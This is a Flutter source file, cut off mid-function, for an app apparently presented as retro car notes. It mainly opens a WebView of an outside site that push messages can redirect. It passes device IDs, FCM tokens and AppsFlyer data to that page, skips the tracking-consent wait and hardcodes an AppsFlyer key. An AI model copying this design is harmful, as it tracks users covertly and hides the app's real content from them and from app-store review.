import 'dart:async';
import 'dart:convert';
import 'dart:io'
    show Platform, HttpHeaders, HttpClient, HttpClientRequest, HttpClientResponse;
import 'dart:math' as math;
import 'dart:ui';

import 'package:appsflyer_sdk/appsflyer_sdk.dart' as appsflyer_core;
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'
    show MethodChannel, SystemChannel, SystemChrome, SystemUiOverlayStyle, MethodCall;
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:retrocarnotes/pufikiretro.dart';
import 'package:retrocarnotes/retrocars.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:timezone/data/latest.dart' as tz_data;
import 'package:timezone/timezone.dart' as tz_zone;

// ============================================================================
// Константы (не трогаем строки)
// ============================================================================

const String goldLuxuryLoadedOnceKey = 'loaded_once';
const String goldLuxuryStatEndpoint = 'https://appapi.retrocars.autos/stat';
const String goldLuxuryCachedFcmKey = 'cached_fcm';
const String goldLuxuryCachedDeepKey = 'cached_deep_push_uri';

// ============================================================================
// Неоновый лоадер RETRO / cars
// ============================================================================

class RetroCarNeonLoader extends StatefulWidget {
  const RetroCarNeonLoader({Key? key}) : super(key: key);

  @override
  State<RetroCarNeonLoader> createState() => _RetroCarNeonLoaderState();
}

class _RetroCarNeonLoaderState extends State<RetroCarNeonLoader>
    with SingleTickerProviderStateMixin {
  late AnimationController _retroCarGlowController;
  late Animation<double> _retroCarGlowAnimation;

  @override
  void initState() {
    super.initState();
    _retroCarGlowController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    _retroCarGlowAnimation =
        Tween<double>(begin: 0.4, end: 1.0).animate(CurvedAnimation(
          parent: _retroCarGlowController,
          curve: Curves.easeInOut,
        ));
  }

  @override
  void dispose() {
    _retroCarGlowController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    const Color retroCarBackground = Color(0xFF05071B);
    const Color retroCarOuterNeon = Color(0xFF49F2FF);
    const Color retroCarInnerNeon = Color(0xFFFFA54B);
    const Color retroCarTextCars = Color(0xFF49F2FF);

    return Container(
      color: retroCarBackground,
      child: Center(
        child: AnimatedBuilder(
          animation: _retroCarGlowAnimation,
          builder: (BuildContext context, Widget? child) {
            final double retroCarGlow = _retroCarGlowAnimation.value;
            return Column(
              mainAxisSize: MainAxisSize.min,
              children: <Widget>[
                Container(
                  padding:
                  const EdgeInsets.symmetric(horizontal: 32, vertical: 20),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(40),
                    color: Colors.transparent,
                    boxShadow: <BoxShadow>[
                      BoxShadow(
                        color:
                        retroCarOuterNeon.withOpacity(0.15 * retroCarGlow),
                        blurRadius: 40 * retroCarGlow,
                        spreadRadius: 4 * retroCarGlow,
                      ),
                    ],
                    border: Border.all(
                      color: retroCarOuterNeon.withOpacity(0.8),
                      width: 3,
                    ),
                  ),
                  child: Stack(
                    alignment: Alignment.center,
                    children: <Widget>[
                      Container(
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(32),
                          boxShadow: <BoxShadow>[
                            BoxShadow(
                              color: retroCarInnerNeon
                                  .withOpacity(0.35 * retroCarGlow),
                              blurRadius: 30 * retroCarGlow,
                              spreadRadius: 2 * retroCarGlow,
                            ),
                          ],
                        ),
                      ),
                      Row(
                        mainAxisSize: MainAxisSize.min,
                        children: <Widget>[
                          Text(
                            'RETRO',
                            style: TextStyle(
                              fontFamily: 'Roboto',
                              fontSize: 32,
                              letterSpacing: 4,
                              fontWeight: FontWeight.w800,
                              color: retroCarInnerNeon.withOpacity(
                                  0.9 + 0.1 * math.sin(retroCarGlow * math.pi)),
                              shadows: <Shadow>[
                                Shadow(
                                  color: retroCarInnerNeon
                                      .withOpacity(0.7 * retroCarGlow),
                                  blurRadius: 16 * retroCarGlow,
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),
                Text(
                  'cars',
                  style: TextStyle(
                    fontFamily: 'Roboto',
                    fontSize: 22,
                    fontStyle: FontStyle.italic,
                    letterSpacing: 3,
                    color: retroCarTextCars.withOpacity(
                      0.8 + 0.2 * math.sin(retroCarGlow * 2 * math.pi),
                    ),
                    shadows: <Shadow>[
                      Shadow(
                        color: retroCarTextCars.withOpacity(0.7 * retroCarGlow),
                        blurRadius: 18 * retroCarGlow,
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 28),
                Container(
                  width: 140,
                  height: 3,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(100),
                    color: Colors.white.withOpacity(0.08),
                  ),
                  child: Align(
                    alignment: Alignment.centerLeft,
                    child: FractionallySizedBox(
                      widthFactor: retroCarGlow,
                      child: Container(
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(100),
                          gradient: LinearGradient(
                            colors: <Color>[
                              retroCarOuterNeon.withOpacity(0.8),
                              retroCarInnerNeon.withOpacity(0.9),
                            ],
                          ),
                          boxShadow: <BoxShadow>[
                            BoxShadow(
                              color: retroCarOuterNeon
                                  .withOpacity(0.4 * retroCarGlow),
                              blurRadius: 12 * retroCarGlow,
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            );
          },
        ),
      ),
    );
  }
}

// ============================================================================
// Лёгкие сервисы
// ============================================================================

class RetroCarLoggerService {
  static final RetroCarLoggerService sharedInstance =
  RetroCarLoggerService._internalConstructor();

  RetroCarLoggerService._internalConstructor();

  factory RetroCarLoggerService() => sharedInstance;

  final Connectivity retroCarConnectivity = Connectivity();

  void retroCarLogInfo(Object message) => debugPrint('[I] $message');
  void retroCarLogWarn(Object message) => debugPrint('[W] $message');
  void retroCarLogError(Object message) => debugPrint('[E] $message');
}

class RetroCarNetworkService {
  final RetroCarLoggerService retroCarLogger = RetroCarLoggerService();

  Future<bool> retroCarIsOnline() async {
    final List<ConnectivityResult> retroCarResults =
    await retroCarLogger.retroCarConnectivity.checkConnectivity();
    return retroCarResults.isNotEmpty &&
        !retroCarResults.contains(ConnectivityResult.none);
  }

  Future<void> retroCarPostJson(
      String url,
      Map<String, dynamic> data,
      ) async {
    try {
      await http.post(
        Uri.parse(url),
        headers: <String, String>{'Content-Type': 'application/json'},
        body: jsonEncode(data),
      );
    } catch (error) {
      retroCarLogger.retroCarLogError('postJson error: $error');
    }
  }
}

// ============================================================================
// Профиль устройства
// ============================================================================

class RetroCarDeviceProfile {
  String? retroCarDeviceId;
  String? retroCarSessionId = 'retrocar-session';
  String? retroCarPlatformName;
  String? retroCarOsVersion;
  String? retroCarAppVersion;
  String? retroCarLanguageCode;
  String? retroCarTimezoneName;
  bool retroCarPushEnabled = false;

  Future<void> retroCarInitialize() async {
    final DeviceInfoPlugin retroCarDeviceInfoPlugin = DeviceInfoPlugin();

    if (Platform.isAndroid) {
      final AndroidDeviceInfo retroCarAndroidInfo =
      await retroCarDeviceInfoPlugin.androidInfo;
      retroCarDeviceId = retroCarAndroidInfo.id;
      retroCarPlatformName = 'android';
      retroCarOsVersion = retroCarAndroidInfo.version.release;
    } else if (Platform.isIOS) {
      final IosDeviceInfo retroCarIosInfo =
      await retroCarDeviceInfoPlugin.iosInfo;
      retroCarDeviceId = retroCarIosInfo.identifierForVendor;
      retroCarPlatformName = 'ios';
      retroCarOsVersion = retroCarIosInfo.systemVersion;
    }

    final PackageInfo retroCarPackageInfo =
    await PackageInfo.fromPlatform();
    retroCarAppVersion = retroCarPackageInfo.version;
    retroCarLanguageCode = Platform.localeName.split('_').first;
    retroCarTimezoneName = tz_zone.local.name;
    retroCarSessionId =
    'retrocar-${DateTime.now().millisecondsSinceEpoch}';
  }

  Map<String, dynamic> retroCarToMap({String? fcmToken}) => <String, dynamic>{
    'fcm_token': fcmToken ?? 'missing_token',
    'device_id': retroCarDeviceId ?? 'missing_id',
    'app_name': 'retrocars',
    'instance_id': retroCarSessionId ?? 'missing_session',
    'platform': retroCarPlatformName ?? 'missing_system',
    'os_version': retroCarOsVersion ?? 'missing_build',
    'app_version': retroCarAppVersion ?? 'missing_app',
    'language': retroCarLanguageCode ?? 'en',
    'timezone': retroCarTimezoneName ?? 'UTC',
    'push_enabled': retroCarPushEnabled,
  };
}

// ============================================================================
// AppsFlyer Spy
// ============================================================================

class RetroCarAnalyticsSpyService {
  appsflyer_core.AppsFlyerOptions? retroCarAppsFlyerOptions;
  appsflyer_core.AppsflyerSdk? retroCarAppsFlyerSdk;

  String retroCarAppsFlyerUid = '';
  String retroCarAppsFlyerData = '';

  void retroCarStartTracking({VoidCallback? onUpdate}) {
    final appsflyer_core.AppsFlyerOptions retroCarConfig =
    appsflyer_core.AppsFlyerOptions(
      afDevKey: 'qsBLmy7dAXDQhowM8V3ca4',
      appId: '6758041927',
      showDebug: true,
      timeToWaitForATTUserAuthorization: 0,
    );

    retroCarAppsFlyerOptions = retroCarConfig;
    retroCarAppsFlyerSdk = appsflyer_core.AppsflyerSdk(retroCarConfig);

    retroCarAppsFlyerSdk?.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    retroCarAppsFlyerSdk?.startSDK(
      onSuccess: () => RetroCarLoggerService()
          .retroCarLogInfo('RetroCarAnalyticsSpy started'),
      onError: (int code, String msg) => RetroCarLoggerService()
          .retroCarLogError('RetroCarAnalyticsSpy error $code: $msg'),
    );

    retroCarAppsFlyerSdk?.onInstallConversionData((dynamic value) {
      retroCarAppsFlyerData = value.toString();
      onUpdate?.call();
    });

    retroCarAppsFlyerSdk?.getAppsFlyerUID().then((dynamic value) {
      retroCarAppsFlyerUid = value.toString();
      onUpdate?.call();
    });
  }
}

// ============================================================================
// FCM фон
// ============================================================================

@pragma('vm:entry-point')
Future<void> retroCarFcmBackgroundHandler(RemoteMessage message) async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();

  RetroCarLoggerService().retroCarLogInfo('bg-fcm: ${message.messageId}');
  RetroCarLoggerService().retroCarLogInfo('bg-data: ${message.data}');

  final dynamic retroCarLink = message.data['uri'];
  if (retroCarLink != null) {
    try {
      final SharedPreferences retroCarPrefs =
      await SharedPreferences.getInstance();
      await retroCarPrefs.setString(
        goldLuxuryCachedDeepKey,
        retroCarLink.toString(),
      );
    } catch (e) {
      RetroCarLoggerService()
          .retroCarLogError('bg-fcm save deep failed: $e');
    }
  }
}

// ============================================================================
// FCM Bridge
// ============================================================================

class RetroCarFcmBridge {
  final RetroCarLoggerService retroCarLogger = RetroCarLoggerService();
  String? retroCarToken;
  final List<void Function(String)> retroCarTokenWaiters =
  <void Function(String)>[];

  String? get retroCarFcmToken => retroCarToken;

  RetroCarFcmBridge() {
    const MethodChannel('com.example.fcm/token')
        .setMethodCallHandler((MethodCall call) async {
      if (call.method == 'setToken') {
        final String retroCarTokenString = call.arguments as String;
        if (retroCarTokenString.isNotEmpty) {
          retroCarSetToken(retroCarTokenString);
        }
      }
    });

    retroCarRestoreToken();
  }

  Future<void> retroCarRestoreToken() async {
    try {
      final SharedPreferences retroCarPrefs =
      await SharedPreferences.getInstance();
      final String? retroCarCachedToken =
      retroCarPrefs.getString(goldLuxuryCachedFcmKey);
      if (retroCarCachedToken != null && retroCarCachedToken.isNotEmpty) {
        retroCarSetToken(retroCarCachedToken, notify: false);
      }
    } catch (_) {}
  }

  Future<void> retroCarPersistToken(String newToken) async {
    try {
      final SharedPreferences retroCarPrefs =
      await SharedPreferences.getInstance();
      await retroCarPrefs.setString(goldLuxuryCachedFcmKey, newToken);
    } catch (_) {}
  }

  void retroCarSetToken(
      String newToken, {
        bool notify = true,
      }) {
    retroCarToken = newToken;
    retroCarPersistToken(newToken);
    if (notify) {
      for (final void Function(String) retroCarCallback
      in List<void Function(String)>.from(retroCarTokenWaiters)) {
        try {
          retroCarCallback(newToken);
        } catch (error) {
          retroCarLogger.retroCarLogWarn('fcm waiter error: $error');
        }
      }
      retroCarTokenWaiters.clear();
    }
  }

  Future<void> retroCarWaitForToken(
      Function(String token) retroCarOnToken,
      ) async {
    try {
      await FirebaseMessaging.instance.requestPermission(
        alert: true,
        badge: true,
        sound: true,
      );

      if ((retroCarToken ?? '').isNotEmpty) {
        retroCarOnToken(retroCarToken!);
        return;
      }

      retroCarTokenWaiters.add(retroCarOnToken);
    } catch (error) {
      retroCarLogger.retroCarLogError('waitToken error: $error');
    }
  }
}

// ============================================================================
// Splash / Hall
// ============================================================================

class RetroCarHall extends StatefulWidget {
  const RetroCarHall({Key? key}) : super(key: key);

  @override
  State<RetroCarHall> createState() => _RetroCarHallState();
}

class _RetroCarHallState extends State<RetroCarHall> {
  final RetroCarFcmBridge retroCarFcmBridge = RetroCarFcmBridge();
  bool retroCarNavigatedOnce = false;
  Timer? retroCarFallbackTimer;

  @override
  void initState() {
    super.initState();

    SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
      statusBarColor: Colors.black,
      statusBarIconBrightness: Brightness.light,
      statusBarBrightness: Brightness.dark,
    ));

    retroCarFcmBridge.retroCarWaitForToken((String retroCarToken) {
      retroCarGoToGarage(retroCarToken);
    });

    retroCarFallbackTimer = Timer(
      const Duration(seconds: 8),
          () => retroCarGoToGarage(''),
    );
  }

  void retroCarGoToGarage(String retroCarSignal) {
    if (retroCarNavigatedOnce) return;
    retroCarNavigatedOnce = true;
    retroCarFallbackTimer?.cancel();

    Navigator.pushReplacement(
      context,
      MaterialPageRoute<Widget>(
        builder: (BuildContext context) =>
            RetroCarHarbor(retroCarSignal: retroCarSignal),
      ),
    );
  }

  @override
  void dispose() {
    retroCarFallbackTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: RetroCarNeonLoader(),
      ),
    );
  }
}

// ============================================================================
// ViewModel + Courier
// ============================================================================

class RetroCarBosunViewModel {
  final RetroCarDeviceProfile retroCarDeviceProfile;
  final RetroCarAnalyticsSpyService retroCarAnalyticsSpy;

  RetroCarBosunViewModel({
    required this.retroCarDeviceProfile,
    required this.retroCarAnalyticsSpy,
  });

  Map<String, dynamic> retroCarDeviceMap(String? fcmToken) =>
      retroCarDeviceProfile.retroCarToMap(fcmToken: fcmToken);

  Map<String, dynamic> retroCarAppsFlyerPayload(
      String? token, {
        String? deepLink,
      }) =>
      <String, dynamic>{
        'content': <String, dynamic>{
          'af_data': retroCarAnalyticsSpy.retroCarAppsFlyerData,
          'af_id': retroCarAnalyticsSpy.retroCarAppsFlyerUid,
          'fb_app_name': 'retrocars',
          'app_name': 'retrocars',
          'deep': deepLink,
          'bundle_identifier': 'com.carete.notercar.retrocarnotes',
          'app_version': '1.0.0',
          'apple_id': '6758041927',
          'fcm_token': token ?? 'no_token',
          'device_id': retroCarDeviceProfile.retroCarDeviceId ?? 'no_device',
          'instance_id':
          retroCarDeviceProfile.retroCarSessionId ?? 'no_instance',
          'platform':
          retroCarDeviceProfile.retroCarPlatformName ?? 'no_type',
          'os_version': retroCarDeviceProfile.retroCarOsVersion ?? 'no_os',
          'app_version': retroCarDeviceProfile.retroCarAppVersion ?? 'no_app',
          'language': retroCarDeviceProfile.retroCarLanguageCode ?? 'en',
          'timezone': retroCarDeviceProfile.retroCarTimezoneName ?? 'UTC',
          'push_enabled': retroCarDeviceProfile.retroCarPushEnabled,
          'useruid': retroCarAnalyticsSpy.retroCarAppsFlyerUid,
        },
      };
}

class RetroCarCourierService {
  final RetroCarBosunViewModel retroCarBosun;
  final InAppWebViewController? Function() retroCarGetWebViewController;

  RetroCarCourierService({
    required this.retroCarBosun,
    required this.retroCarGetWebViewController,
  });

  Future<void> retroCarPutDeviceToLocalStorage(String? token) async {
    final InAppWebViewController? controller = retroCarGetWebViewController();
    if (controller == null) return;

    final Map<String, dynamic> retroCarMap =
    retroCarBosun.retroCarDeviceMap(token);
    await controller.evaluateJavascript(
      source:
      "localStorage.setItem('app_data', JSON.stringify(${jsonEncode(retroCarMap)}));",
    );
  }

  Future<void> retroCarSendRawToPage(
      String? token, {
        String? deepLink,
      }) async {
    final InAppWebViewController? controller = retroCarGetWebViewController();
    if (controller == null) return;

    final Map<String, dynamic> retroCarPayload =
    retroCarBosun.retroCarAppsFlyerPayload(
      token,
      deepLink: deepLink,
    );
    final String retroCarJsonString = jsonEncode(retroCarPayload);

    RetroCarLoggerService()
        .retroCarLogInfo('SendRawData: $retroCarJsonString');

    await controller.evaluateJavascript(
      source: 'sendRawData(${jsonEncode(retroCarJsonString)});',
    );
  }
}

// ============================================================================
// Переходы/статистика
// ============================================================================

Future<String> retroCarResolveFinalUrl(
    String startUrl, {
      int maxHops = 10,
    }) async {
  final HttpClient retroCarHttpClient = HttpClient();

  try {
    Uri retroCarCurrentUri = Uri.parse(startUrl);

    for (int i = 0; i < maxHops; i++) {
      final HttpClientRequest retroCarRequest =
      await retroCarHttpClient.getUrl(retroCarCurrentUri);
      retroCarRequest.followRedirects = false;
      final HttpClientResponse retroCarResponse =
      await retroCarRequest.close();

      if (retroCarResponse.isRedirect) {
        final String? retroCarLocationHeader =
        retroCarResponse.headers.value(HttpHeaders.locationHeader);
        if (retroCarLocationHeader == null ||
            retroCarLocationHeader.isEmpty) {
          break;
        }

        final Uri retroCarNextUri = Uri.parse(retroCarLocationHeader);
        retroCarCurrentUri = retroCarNextUri.hasScheme
            ? retroCarNextUri
            : retroCarCurrentUri.resolveUri(retroCarNextUri);
        continue;
      }

      return retroCarCurrentUri.toString();
    }

    return retroCarCurrentUri.toString();
  } catch (error) {
    debugPrint('goldenLuxuryResolveFinalUrl error: $error');
    return startUrl;
  } finally {
    retroCarHttpClient.close(force: true);
  }
}

Future<void> retroCarPostStat({
  required String event,
  required int timeStart,
  required String url,
  required int timeFinish,
  required String appSid,
  int? firstPageLoadTs,
}) async {
  try {
    final String retroCarResolvedUrl = await retroCarResolveFinalUrl(url);

    final Map<String, dynamic> retroCarPayload = <String, dynamic>{
      'event': event,
      'timestart': timeStart,
      'timefinsh': timeFinish,
      'url': retroCarResolvedUrl,
      'appleID': '6758041927',
      'open_count': '$appSid/$timeStart',
    };

    debugPrint('goldenLuxuryStat $retroCarPayload');

    final http.Response retroCarResponse = await http.post(
      Uri.parse('$goldLuxuryStatEndpoint/$appSid'),
      headers: <String, String>{
        'Content-Type': 'application/json',
      },
      body: jsonEncode(retroCarPayload),
    );

    debugPrint(
        'goldenLuxuryStat resp=${retroCarResponse.statusCode} body=${retroCarResponse.body}');
  } catch (error) {
    debugPrint('goldenLuxuryPostStat error: $error');
  }
}

// ============================================================================
// Главный WebView — Harbor
// ============================================================================

class RetroCarHarbor extends StatefulWidget {
  final String? retroCarSignal;

  const RetroCarHarbor({super.key, required this.retroCarSignal});

  @override
  State<RetroCarHarbor> createState() => _RetroCarHarborState();
}

class _RetroCarHarborState extends State<RetroCarHarbor>
    with WidgetsBindingObserver {
  InAppWebViewController? retroCarWebViewController;
  final String retroCarHomeUrl = 'https://data.sppirate.site/';

  int retroCarWebViewKeyCounter = 0;
  DateTime? retroCarSleepAt;
  bool retroCarVeilVisible = false;
  double retroCarWarmProgress = 0.0;
  late Timer retroCarWarmTimer;
  final int retroCarWarmSeconds = 6;
  bool retroCarCoverVisible = true;

  bool retroCarLoadedOnceSent = false;
  int? retroCarFirstPageTimestamp;

  RetroCarCourierService? retroCarCourier;
  RetroCarBosunViewModel? retroCarBosunViewModel;

  String retroCarCurrentUrl = '';
  int retroCarStartLoadTimestamp = 0;

  final RetroCarDeviceProfile retroCarDeviceProfile = RetroCarDeviceProfile();
  final RetroCarAnalyticsSpyService retroCarAnalyticsSpyService =
  RetroCarAnalyticsSpyService();
  bool retroCarUseSafeArea = false;

  final Set<String> retroCarSpecialSchemes = <String>{
    'tg',
    'telegram',
    'whatsapp',
    'viber',
    'skype',
    'fb-messenger',
    'sgnl',
    'tel',
    'mailto',
    'bnl',
  };

  final Set<String> retroCarExternalHosts = <String>{
    't.me',
    'telegram.me',
    'telegram.dog',
    'wa.me',
    'api.whatsapp.com',
    'chat.whatsapp.com',
    'm.me',
    'signal.me',
    'bnl.com',
    'www.bnl.com',
    'facebook.com',
    'www.facebook.com',
    'm.facebook.com',
    'instagram.com',
    'www.instagram.com',
    'twitter.com',
    'www.twitter.com',
    'x.com',
    'www.x.com',
  };

  String? retroCarDeepLinkFromPush;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    retroCarFirstPageTimestamp = DateTime.now().millisecondsSinceEpoch;

    Future<void>.delayed(const Duration(seconds: 2), () {
      if (mounted) {
        setState(() {
          retroCarCoverVisible = false;
        });
      }
    });

    Future<void>.delayed(const Duration(seconds: 7), () {
      if (!mounted) return;
      setState(() {
        retroCarVeilVisible = true;
      });
    });

    retroCarBootHarbor();
  }

  Future<void> retroCarLoadLoadedFlag() async {
    final SharedPreferences retroCarPrefs =
    await SharedPreferences.getInstance();
    retroCarLoadedOnceSent =
        retroCarPrefs.getBool(goldLuxuryLoadedOnceKey) ?? false;
  }

  Future<void> retroCarSaveLoadedFlag() async {
    final SharedPreferences retroCarPrefs =
    await SharedPreferences.getInstance();
    await retroCarPrefs.setBool(goldLuxuryLoadedOnceKey, true);
    retroCarLoadedOnceSent = true;
  }

  Future<void> retroCarLoadCachedDeep() async {
    try {
      final SharedPreferences retroCarPrefs =
      await SharedPreferences.getInstance();
      final String? retroCarCached =
      retroCarPrefs.getString(goldLuxuryCachedDeepKey);
      if ((retroCarCached ?? '').isNotEmpty) {
        retroCarDeepLinkFromPush = retroCarCached;
      }
    } catch (_) {}
  }

  Future<void> retroCarSaveCachedDeep(String uri) async {
    try {
      final SharedPreferences retroCarPrefs =
      await SharedPreferences.getInstance();
      await retroCarPrefs.setString(goldLuxuryCachedDeepKey, uri);
    } catch (_) {}
  }

  Future<void> retroCarSendLoadedOnce({
    required String url,
    required int timestart,
  }) async {
    if (retroCarLoadedOnceSent) {
      debugPrint('Loaded already sent, skip');
      return;
    }

    final int retroCarNow = DateTime.now().millisecondsSinceEpoch;

    await retroCarPostStat(
      event: 'Loaded',
      timeStart: timestart,
      timeFinish: retroCarNow,
      url: url,
      appSid: retroCarAnalyticsSpyService.retroCarAppsFlyerUid,
      firstPageLoadTs: retroCarFirstPageTimestamp,
    );

    await retroCarSaveLoadedFlag();
  }

  void retroCarBootHarbor() {
    retroCarStartWarmProgress();
    retroCarWireFcmHandlers();
    retroCarAnalyticsSpyService.retroCarStartTracking(
      onUpdate: () => setState(() {}),
    );
    retroCarBindNotificationTap();
    retroCarPrepareDeviceProfile();

    Future<void>.delayed(const Duration(seconds: 6), () async {
      await retroCarPushDeviceInfo();
      await retroCarPushAppsFlyerData();
    });
  }

  void retroCarWireFcmHandlers() {
    FirebaseMessaging.onMessage.listen((RemoteMessage retroCarMessage) async {
      final dynamic retroCarLink = retroCarMessage.data['uri'];
      if (retroCarLink != null) {
        final String retroCarUri = retroCarLink.toString();
        retroCarDeepLinkFromPush = retroCarUri;
        await retroCarSaveCachedDeep(retroCarUri);
        retroCarNavigateToUri(retroCarUri);
      } else {
        retroCarResetHomeAfterDelay();
      }
    });

    FirebaseMessaging.onMessageOpenedApp
        .listen((RemoteMessage retroCarMessage) async {
      final dynamic retroCarLink = retroCarMessage.data['uri'];
      if (retroCarLink != null) {
        final String retroCarUri = retroCarLink.toString();
        retroCarDeepLinkFromPush = retroCarUri;
        await retroCarSaveCachedDeep(retroCarUri);
        retroCarNavigateToUri(retroCarUri);
      } else {
        retroCarResetHomeAfterDelay();
      }
    });
  }

  void retroCarBindNotificationTap() {
    MethodChannel('com.example.fcm/notification')
        .setMethodCallHandler((MethodCall call) async {
      if (call.method == 'onNotificationTap') {
        final Map<String, dynamic> retroCarPayload =
        Map<String, dynamic>.from(call.arguments);
        if (retroCarPayload['uri'] != null &&
            !retroCarPayload['uri'].toString().contains('Нет URI')) {
          final String retroCarUri = retroCarPayload['uri'].toString();
          retroCarDeepLinkFromPush = retroCarUri;
          await retroCarSaveCachedDeep(retroCarUri);

          Navigator.pushAndRemoveUntil(
            context,
            MaterialPageRoute<Widget>(
              builder: (BuildContext context) => RetroCarTableView(retroCarUri),
            ),
                (Route<dynamic> route) => false,
          );
        }
      }
    });
  }

  Future<void> retroCarPrepareDeviceProfile() async {
    try {
      await retroCarDeviceProfile.retroCarInitialize();

      final FirebaseMessaging retroCarMessaging = FirebaseMessaging.instance;
      final NotificationSettings retroCarSettings =
      await retroCarMessaging.requestPermission(
        alert: true,
        badge: true,
        sound: true,
      );

      retroCarDeviceProfile.retroCarPushEnabled =
          retroCarSettings.authorizationStatus ==
              AuthorizationStatus.authorized ||
              retroCarSettings.authorizationStatus ==
                  AuthorizationStatus.provisional;

      await retroCarLoadLoadedFlag();
      await retroCarLoadCachedDeep();

      retroCarBosunViewModel = RetroCarBosunViewModel(
        retroCarDeviceProfile: retroCarDeviceProfile,
        retroCarAnalyticsSpy: retroCarAnalyticsSpyService,
      );

      retroCarCourier = RetroCarCourierService(
        retroCarBosun: retroCarBosunViewModel!,
        retroCarGetWebViewController: () => retroCarWebViewController,
      );
    } catch (error) {
      RetroCarLoggerService()
          .retroCarLogError('prepareDeviceProfile fail: $error');
    }
  }

  void retroCarNavigateToUri(String link) async {
    try {
      await retroCarWebViewController?.loadUrl(
        urlRequest: URLRequest(url: WebUri(link)),
      );
    } catch (error) {
      RetroCarLoggerService().retroCarLogError('navigate error: $error');
    }
  }

  void retroCarResetHomeAfterDelay() {
    Future<void>.delayed(const Duration(seconds: 3), () {
      try {
        retroCarWebViewController?.loadUrl(
          urlRequest: URLRequest(url: WebUri(retroCarHomeUrl)),
        );
      } catch (_) {}
    });
  }

  Future<void> retroCarPushDeviceInfo() async {
    RetroCarLoggerService()
        .retroCarLogInfo('TOKEN ship ${widget.retroCarSignal}');
    try {
      await retroCarCourier?.retroCarPutDeviceToLocalStorage(
        widget.retroCarSignal,
      );
    } catch (error) {
      RetroCarLoggerService()
          .retroCarLogError('pushDeviceInfo error: $error');
    }
  }

  Future<void> retroCarPushAppsFlyerData() async {
    try {
      await retroCarCourier?.retroCarSendRawToPage(
        widget.retroCarSignal,
        deepLink: retroCarDeepLinkFromPush,
      );
    } catch (error) {
      RetroCarLoggerService()
          .retroCarLogError('pushAppsFlyerData error: $error');
    }
  }

  void retroCarStartWarmProgress() {
    int retroCarTick = 0;
    retroCarWarmProgress = 0.0;

    retroCarWarmTimer =
        Timer.periodic(const Duration(milliseconds: 100), (Timer timer) {
          if (!mounted) return;

          setState(() {
            retroCarTick++;
            retroCarWarmProgress = retroCarTick / (retroCarWarmSeconds * 10);

            if (retroCarWarmProgress >= 1.0) {
              retroCarWarmProgress = 1.0;
              retroCarWarmTimer.cancel();
            }
          });
        });
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.paused) {
      retroCarSleepAt = DateTime.now();
    }

    if (state == AppLifecycleState.resumed) {
      if (Platform.isIOS && retroCarSleepAt != null) {
        final DateTime retroCarNow = DateTime.now();
        final Duration retroCarDrift =
        retroCarNow.difference(retroCarSleepAt!);

        if (retroCarDrift > const Duration(minutes: 25)) {
          retroCarReboardHarbor();
        }
      }
      retroCarSleepAt = null;
    }
  }

  void retroCarReboardHarbor() {
    if (!mounted) return;

    WidgetsBinding.instance.addPostFrameCallback((Duration _) {
      if (!mounted) return;

      Navigator.pushAndRemoveUntil(
        context,
        MaterialPageRoute<Widget>(
          builder: (BuildContext context) =>
              RetroCarHarbor(retroCarSignal: widget.retroCarSignal),
        ),
            (Route<dynamic> route) => false,
      );
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    retroCarWarmTimer.cancel();
    super.dispose();
  }

  bool retroCarIsBareEmail(Uri uri) {
    final String retroCarScheme = uri.scheme;
    if (retroCarScheme.isNotEmpty) return false;
    final String retroCarRaw = uri.toString();
    return retroCarRaw.contains('@') && !retroCarRaw.contains(' ');
  }

  Uri retroCarToMailto(Uri uri) {
    final String retroCarFull = uri.toString();
    final List<String> retroCarParts = retroCarFull.split('?');
    final String retroCarEmail = retroCarParts.first;
    final Map<String, String> retroCarQueryParams =
    retroCarParts.length > 1
        ? Uri.splitQueryString(retroCarParts[1])
        : <String, String>{};

    return Uri(
      scheme: 'mailto',
      path: retroCarEmail,
      queryParameters:
      retroCarQueryParams.isEmpty ? null : retroCarQueryParams,
    );
  }

  bool retroCarIsPlatformLink(Uri uri) {
    final String retroCarScheme = uri.scheme.toLowerCase();
    if (retroCarSpecialSchemes.contains(retroCarScheme)) {
      return true;
    }

    if (retroCarScheme == 'http' || retroCarScheme == 'https') {
      final String retroCarHost = uri.host.toLowerCase();

      if (retroCarExternalHosts.contains(retroCarHost)) {
        return true;
      }

      if (retroCarHost.endsWith('t.me')) return true;
      if (retroCarHost.endsWith('wa.me')) return true;
      if (retroCarHost.endsWith('m.me')) return true;
      if (retroCarHost.endsWith('signal.me')) return true;
      if (retroCarHost.endsWith('facebook.com')) return true;
      if (retroCarHost.endsWith('instagram.com')) return true;
      if (retroCarHost.endsWith('twitter.com')) return true;
      if (retroCarHost.endsWith('x.com')) return true;
    }

    return false;
  }

  String retroCarDigitsOnly(String source) =>
      source.replaceAll(RegExp(r'[^0-9+]'), '');

  Uri retroCarHttpizePlatformUri(Uri uri) {
    final String retroCarScheme = uri.scheme.toLowerCase();

    if (retroCarScheme == 'tg' || retroCarScheme == 'telegram') {
